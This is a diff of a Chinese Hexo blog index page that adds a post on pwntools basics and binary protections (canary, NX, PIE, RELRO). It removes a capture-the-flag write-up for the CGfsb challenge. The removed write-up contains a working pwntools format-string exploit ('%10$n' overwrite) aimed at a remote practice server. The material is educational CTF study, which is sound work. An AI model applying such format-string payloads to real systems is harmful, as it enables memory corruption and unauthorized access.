@@ -145,6 +145,81 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/08/pwn%E5%85%A5%E9%97%A8%E7%9F%A5%E8%AF%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/10/08/pwn%E5%85%A5%E9%97%A8%E7%9F%A5%E8%AF%86/" class="post-title-link" itemprop="url">pwn入门知识</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-10-08 15:09:59 / 修改时间：15:22:27" itemprop="dateCreated datePublished" datetime="2024-10-08T15:09:59+08:00">2024-10-08</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="pwntools基本指令"><a href="#pwntools基本指令" class="headerlink" title="pwntools基本指令"></a>pwntools基本指令</h2><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><p>查看程式開了哪些保護機制</p>
+<p>安裝：Pwntools gdb</p>
+<p>使用：checksec </p>
+<h3 id="nc-ncat"><a href="#nc-ncat" class="headerlink" title="nc &#x2F; ncat"></a>nc &#x2F; ncat</h3><p>远程连线工具</p>
+<p>使⽤ ncat 将程式在靶机连接起來，接着使用 nc 连接</p>
+<p>使用:nc</p>
+<h3 id="Vim"><a href="#Vim" class="headerlink" title="Vim"></a>Vim</h3><p>编辑器</p>
+<p>安裝：sudo apt install vim</p>
+<p>Relro：Full Relro（重定位表只读） Relocation Read Only， 重定位表只读。重定位表即.got 和 .plt个表。</p>
+<p>Stack：No Canary found（能栈溢出） 栈保护。栈溢出保护是一种缓冲区溢出攻击缓解手段。启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。 简单来说就是通过验证cookie，来判断执行的代码是不是恶意代码</p>
+<p>NX： NX enable（不可执行内存） Non-Executable Memory，不可执行内存。 原理是将数据所在内存页标识为不可执行，防止因为程序运行出现溢出而使得攻击者的shellcode可能会在数据区尝试执行的情况。NX是对栈和堆的一种保护机制。实验需要关闭NX和地址随机化，否则执行shellcode时，CPU就会抛出异常，而不是去执行恶意指令。Linux系统叫做NX，Windows系统中类似的机制叫DEP(Data Execute Prevention)</p>
+<p>PIE： PIE enable（开启ASLR 地址随机化） Address space layout randomization，地址空间布局随机化。通过将数据随机放置来防止攻击</p>
+<hr>
+<h1 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a><em><strong>pwntools</strong></em></h1><h2 id="接收远端传回的数据"><a href="#接收远端传回的数据" class="headerlink" title="接收远端传回的数据"></a>接收远端传回的数据</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">interactive() : 在取得shell之后使用,直接进行交互，相当于回到shell的模式。</span><br><span class="line"></span><br><span class="line">recv(numb=字节大小, timeout=default) : 接收指定字节数。</span><br><span class="line"></span><br><span class="line">recvall() : 一直接收直到达到文件EOF。</span><br><span class="line"></span><br><span class="line">recvline(keepends=<span class="literal">True</span>) : 接收一行，keepends为是否保留行尾的\n。</span><br><span class="line"></span><br><span class="line">recvuntil(delims, drop=<span class="literal">False</span>) : 一直读到delims的pattern出现为止。</span><br><span class="line"></span><br><span class="line">recvrepeat(timeout=default) : 持续接收直到EOF或timeout。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="向远端发送数据"><a href="#向远端发送数据" class="headerlink" title="向远端发送数据"></a>向远端发送数据</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">send(data) : 发送数据。</span><br><span class="line"></span><br><span class="line">sendline(data) : 发送一行数据，相当于在数据末尾加\n。</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/08/ret2csu%E4%B8%87%E8%83%BDgadget/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -799,89 +874,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%83%A8%E5%88%86%E4%BE%8B%E9%A2%98%E6%AD%A5%E9%AA%A4/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2024/10/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%83%A8%E5%88%86%E4%BE%8B%E9%A2%98%E6%AD%A5%E9%AA%A4/" class="post-title-link" itemprop="url">格式化字符串部分例题步骤</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2024-10-08 15:07:46 / 修改时间：15:27:41" itemprop="dateCreated datePublished" datetime="2024-10-08T15:07:46+08:00">2024-10-08</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>​                                                                               <em><strong>攻防世界CGfsb</strong></em></p>
-<p>下载附件在vm中打开，checksec指令获得其设置的保护措施</p>
-<p><img src="https://ooo.0x0.ooo/2024/03/26/OgdNlN.png"></p>
-<p>由pwntools可知此开启了Canary，但未有pie操作禁止</p>
-<p>拖入ida32位打开后F5反编译得</p>
-<p><img src="https://ooo.0x0.ooo/2024/03/26/OgdF7B.png"></p>
-<p>分析可得可利用跳转操作使pwnme值&#x3D;8</p>
-<p><img src="https://ooo.0x0.ooo/2024/03/26/OgdrBC.png"></p>
-<p>利用%n的属性进行pwnme的赋值</p>
-<p>可尝试交互判断其偏移位置<img src="https://ooo.0x0.ooo/2024/03/26/OgdAZL.png"></p>
-<p>A的ASCII值为41，由此可判断输入并存储的数据AAAA应在栈中偏移值为10的地址</p>
-<p>可得代码如下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;61.147.171.105&quot;</span>, <span class="number">49339</span>);</span><br><span class="line">p.recvuntil(<span class="string">&quot;please tell me your name&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;aa&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;leave your message please&quot;</span>)</span><br><span class="line">payload =p32(<span class="number">0x0804A068</span>)+<span class="string">b&quot;aaaa%10$n&quot;</span>;<span class="comment">#b统一形式转字符</span></span><br><span class="line">p.sendline(payload);</span><br><span class="line"></span><br><span class="line">p.interactive();</span><br></pre></td></tr></table></figure>
-
-<p>vm运行即得flag。</p>
-<p><img src="https://ooo.0x0.ooo/2024/03/26/OgdgLx.png"></p>
-<hr>
-<ol>
-<li>**p32(0x0804a068)是pwnme的地址;**（ida中双击pwnme即得）</li>
-<li>**”aaaa%10$n”:**这里四个a的作用是填充字符数，因为p32函数将pwnme地址转化成四个字节的小端序字符，我们希望写入pwnme的数字是8，因此再填充4个任意字符这样下来%之前共有八个字符了。</li>
-<li><strong>举个其他的例子🌰</strong>: %85c%7$n——将85写入栈内第7个参数所指向的地址。</li>
-<li><strong>$ 是偏移符号</strong>：前面贴着偏移量，而后紧跟n。</li>
-<li><strong>%n</strong> ：打印到目前为止所写的字符数</li>
-<li>总的来说payload代表意为将第二段%之前输入的字符数载入到<strong>栈中偏移十位的变量中</strong>（导入了地址所以转移到了pwnme中）。</li>
-</ol>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -951,7 +943,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">42</span>
+          <span class="site-state-item-count">43</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
